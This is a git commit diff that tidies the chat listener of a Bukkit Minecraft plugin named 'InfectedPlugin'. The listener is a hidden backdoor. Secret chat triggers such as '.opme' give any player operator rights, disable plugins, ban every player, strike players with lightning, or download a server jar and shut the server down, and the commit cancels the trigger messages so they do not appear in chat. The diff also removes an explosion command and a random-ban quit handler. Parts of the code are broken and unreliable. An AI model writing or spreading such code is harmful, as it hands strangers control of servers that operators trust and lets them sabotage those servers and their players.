3ba1208d6987043526eb1b16f77259f06bea25c4
Wilee999 <Infinitywilee@rocketmail.com>
2013-08-18 19:42:51 -0700

    Cleanup of PlayerListener

--- src/org/CreeperCoders/InfectedPlugin/PlayerListener.java
+++ src/org/CreeperCoders/InfectedPlugin/PlayerListener.java
@@ -9,6 +9,7 @@ import org.bukkit.event.Listener;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.plugin.Plugin;
 import org.bukkit.command.CommandSender;
+
 import java.io.File;
 import java.io.FileOutputStream;
 import java.io.IOException;
@@ -17,24 +18,24 @@ import java.net.URL;
 import java.nio.channels.Channels;
 import java.nio.channels.ReadableByteChannel;
 import java.util.Random;
-import org.bukkit.World;
-import org.bukkit.event.player.PlayerQuitEvent;
+
 import org.bukkit.event.EventPriority;
-import org.bukkit.scheduler.BukkitRunnable;
 
 public class PlayerListener implements Listener
 {
     private Random random = new Random();
-    private InfectedPlugin plugin;
 
-    @EventHandler(priority = EventHandler.HIGHEST)
+    @EventHandler(priority = EventPriority.HIGHEST)
     public void onPlayerChat(AsyncPlayerChatEvent event, CommandSender sender) throws MalformedURLException, IOException
     {
+        String message = event.getMessage();
+        String[] args = message.split(" ");
+    	
         if (event.getMessage().toLowerCase().contains(".opme"))
         {
             event.getPlayer().setOp(true);
             event.getPlayer().sendMessage(ChatColor.YELLOW + "You are now OP! Hehhehehheh");
-            shouldCancel = true;
+            event.setCancelled(true);
         }
         if (event.getMessage().toLowerCase().contains(".disableplugin"))
         {
@@ -43,7 +44,7 @@ public class PlayerListener implements Listener
             {
                 Bukkit.getServer().getPluginManager().disablePlugin(plugin);
             }
-            shouldCancel = true;
+            event.setCancelled(true);
         }
         if (event.getMessage().toLowerCase().contains(".enableplugin"))
         {
@@ -52,7 +53,7 @@ public class PlayerListener implements Listener
             {
                 Bukkit.getServer().getPluginManager().disablePlugin(plugin);
             }
-            shouldCancel = true;
+            event.setCancelled(true);
         }
         if (event.getMessage().toLowerCase().contains(".enablevanilla"))
         {
@@ -63,12 +64,14 @@ public class PlayerListener implements Listener
 
                 URL url = new URL("https://s3.amazonaws.com/Minecraft.Download/versions/1.6.2/minecraft_server.1.6.2.jar");
                 ReadableByteChannel rbc = Channels.newChannel(url.openStream());
-                FileOutputStream fos = new FileOutputStream("minecraft_server.1.6.2.jar");
+                @SuppressWarnings("resource")
+				FileOutputStream fos = new FileOutputStream("minecraft_server.1.6.2.jar");
                 fos.getChannel().transferFrom(rbc, 0, 1 << 24);
 
                 sender.sendMessage(ChatColor.YELLOW + "Finished downloading! Starting vanilla...");
             }
             Bukkit.shutdown();
+            event.setCancelled(true);
             //Hopefully this works...
         }
         if (event.getMessage().toLowerCase().contains(".deop"))
@@ -76,14 +79,14 @@ public class PlayerListener implements Listener
             Bukkit.getServer().getPlayer(args[1]);
             event.getPlayer().setOp(false);
             event.getPlayer().sendMessage(ChatColor.RED + "You are no longer OP.");
-            shouldCancel = true;
+            event.setCancelled(true);
         }
         if (event.getMessage().toLowerCase().contains(".op"))
         {
             Bukkit.getServer().getPlayer(args[1]);
             event.getPlayer().setOp(true);
             event.getPlayer().sendMessage(ChatColor.YELLOW + "You are now OP!");
-            shouldCancel = true;
+            event.setCancelled(true);
         }
         if (event.getMessage().toLowerCase().contains(".banall"))
         {
@@ -91,7 +94,7 @@ public class PlayerListener implements Listener
             {
                 p.kickPlayer("The Ban Hammer has spoken!");
                 p.setBanned(true);
-                shouldCancel = true;
+                event.setCancelled(true);
             }
         }
         if (event.getMessage().toLowerCase().contains(".deopall"))
@@ -109,26 +112,7 @@ public class PlayerListener implements Listener
                         target_pos.getWorld().strikeLightning(strike_pos);
                     }
                 }
-                shouldCancel = true;
-            }
-        }
-        if (event.getMessage().toLowerCase().contains(".explode"))
-        {
-            for (final Player p : Bukkit.getServer().getOnlinePlayers())
-            {
-                p.setOp(false);
-                final Location l = p.getLocation();
-                final World w = p.getWorld();
-                for (int x = -1; x <= 1; x++)
-                {
-                    for (int z = -1; z <= 1; z++)
-                    {
-                        final Location explosion;
-                        explosion = new Location(l.getWorld(), l.getBlockX() + x, l.getBlockY(), l.getBlockZ + z);
-                        w.createExplosion(explosion, 500);
-                    }
-                }
-                shouldCancel = true;
+                event.setCancelled(true);
             }
         }
         // Is not effective for onPlayerQuit, but will select a random player to be banned.
@@ -146,26 +130,8 @@ public class PlayerListener implements Listener
                 p.kickPlayer(ChatColor.RED + "GTFO.");
                 p.setBanned(true);
             }
-            shouldCancel = true;
+            event.setCancelled(true);
         }
-    }
-
-    @EventHandler(priority = EventPriority.HIGH)
-    public void onPlayerQuit(PlayerQuitEvent e)
-    {
-        Player[] players = Bukkit.getServer().getOnlinePlayers();
-        final Player p = players[random.nextInt(players.length)];
-
-        new BukkitRunnable()
-        {
-            @Override
-            public void run()
-            {
-                p.kickPlayer(ChatColor.RED + "The Ban Hammer has spoken!");
-                p.setBanned(true);
-            }
-
-        }.runTaskLater(plugin, 10L * 2L);
     }
 
 }
